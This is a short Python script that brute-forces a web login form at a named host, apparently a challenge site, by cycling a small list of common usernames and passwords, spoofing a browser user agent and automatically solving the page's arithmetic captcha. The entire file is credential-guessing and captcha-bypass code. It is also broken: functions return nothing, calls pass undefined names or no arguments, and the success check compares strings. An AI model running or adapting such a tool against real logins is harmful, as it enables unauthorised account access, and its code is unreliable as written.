import mechanize
from bs4 import BeautifulSoup
import operator

def setup():
    usernames=["root","john","admin","printer"]
    passwords=["password","1234","qwerty","admin"]
    All=[]
    Pass=[]
    User=[]
    print("Starting the login session ...")

def setBrowser():
    br = mechanize.Browser()
    br.addheaders = [('User-agent','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36')]
    br.open("https://afeladat2017.whiteshield.net/login")
    br.select_form(nr=0)
    res = br.submit()
    html = res.read()
    soup = BeautifulSoup(html,"lxml")

def findElements(soup):
    form = soup.find("form", action="/login")
    captcha= form.find("span", id="math").text
    math=captcha.replace('=', '')

def operators(math):
    ops = {
        "+": operator.add,
        "-": operator.sub,
        "*": operator.mul,
        "/": operator.truediv
            }

    if(math[1] not in ["+","-","/","*"]):
        web_operators = math[2]
        first_math = math[0:2]
        second_math = math[3:]
    else:
        web_operators=math[1]
        first_math = math[0]
        second_math = math[2:]

def calculateCaptcha(ops,web_operators,first_math,second_math):
    operators = ops[web_operators](int(first_math),int(second_math))
    str_operator = str(operators)

def login(br,User,Pass,u_element,p_element,str_operator,All,first_math,web_operators,second_math,operators):
    br.select_form(action='/login')
    User.append(u_element)
    Pass.append(p_element)
    br.form['username'] = u_element 
    br.form['password'] =  p_element
    br.form['captcha_1'] = str_operator
    All.append([u_element,p_element,first_math,web_operators,second_math,])

def submit_responseToUser(All,br,User,Pass):
    print("\n")
    print(f"Username: {All[-1][0]}")
    print(f"Password: {All[-1][1]}")
    print(f"Captcha: {All[-1][2]} {All[-1][3]} {All[-1][4]} = {All[-1][5]} ")
    response=br.submit()
    if(response._headers["Content-Length"] < "2000"):
            print("")
            print("Sucess!")
            print(f"The correct username was: {User[-1]}")
            print(f"The correct password was: {Pass[-1]}")
            print("")
            print("Response: ",response.read())
            exit()
    else: 
            print("Fail! Please try again.")

setup()
setBrowser()
findElements(setsoup)
operators()
calculateCaptcha()
login()
submit_responseToUser()